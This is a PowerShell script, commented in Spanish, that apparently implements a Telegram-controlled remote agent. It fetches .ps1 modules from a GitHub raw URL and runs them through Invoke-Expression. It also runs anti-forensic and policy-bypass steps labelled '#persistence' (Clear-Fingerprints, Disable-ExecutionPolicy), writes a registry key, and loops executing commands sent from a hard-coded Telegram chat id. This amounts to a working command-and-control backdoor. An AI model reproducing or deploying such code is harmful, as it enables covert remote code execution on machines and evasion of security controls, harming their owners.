function loader{    # aqui empieza la funcion loader
    param(
        [Parameter(Mandatory)]
        [string] $file,
        [Parameter(Mandatory)]
        [string] $path
    )
    $RawURL = $path + $file + ".ps1"
    return New-Request -URL $RawURL
}

function New-Request{
    param(
        [string] $method="GET",
        [Parameter(Mandatory)]
        [string] $URL,
        [string] $data
    )
    $wc = new-object system.net.WebClient
    if ($proxy){
        $prx = new-object System.Net.WebProxy
        $prx.Address = $proxy
        $wc.proxy = $prx
    }

    if ($method -eq "POST"){
        $wc.UploadString($url, "POST", $data)
    } else{
        $webpage = $wc.DownloadData($url)
        $data = [System.Text.Encoding]::ASCII.GetString($webpage)
        return $data
    }
}

$condition = $true
$path = "https://raw.githubusercontent.com/josprou/BotAnsible/main/" # Dirección local donde cargar funciones y devolver resultados en caso de necesidad
loader -path $path -file "account_ansible" | iex
$commandlist=@('account_ansible')
$GLOBAL:joblist=@{}
#persistence
Clear-Fingerprints
Disable-ExecutionPolicy

$RegKey = 'HKCU:\Software\classes\MyTelegram'
New-MyTelegramConfiguration

while($condition){
    $telegrams = Get-TelegramTimeLine -MaxinumMessages 1

    $telegrams | foreach {
        $command = $_.message.text
        $GLOBAL:chat_id= $_.message.chat.id
        [int]$update_id = $_.update_id

        # Lectura de Telegrams
        [int]$LastUpdateId = Get-LastUpdateID
        if($update_id -gt $LastUpdateId){
            $result = $true
            Update-Time -LastUpdateID $update_id
        }else{
            $result = $false
        }

        # Comprobación de identidad y privilegios
        #                   Jose                           
        if(($chat_id -eq "685749607")){
            $result = $true        
        }else{
            $result = $false
        }

        if ($result -eq $true){
            $command = $command.split("|")
            $command
            if($command[0] -eq "bar"){
                loader -path $path -file bar
                bar
            }
            if($command[0] -eq "load"){
                if($commandlist -notcontains $command[1]){
                    loader -path $path -file $command[1] | iex
                    $commandlist += $command[1]
                }
                if ($command[2])
                {
                    $comando = $command[1];$comando += " ";$comando+=$command[2]
                    $comando | iex 
                }
                else
                {
                    $comando = $command[1]
                    $comando | iex
                }
            }
            if($command[0] -eq "cmdls"){
                $global:execute = $commandlist
            }
            $global:execute
            #$global:execute.Length
            if($global:execute.length -gt 0){send-results -chat_id $chat_id -texto $global:execute;$global:execute=$null}
            $condition = $command[0] -ne "quit!"         
        }     
    }    
    sleep 5
}
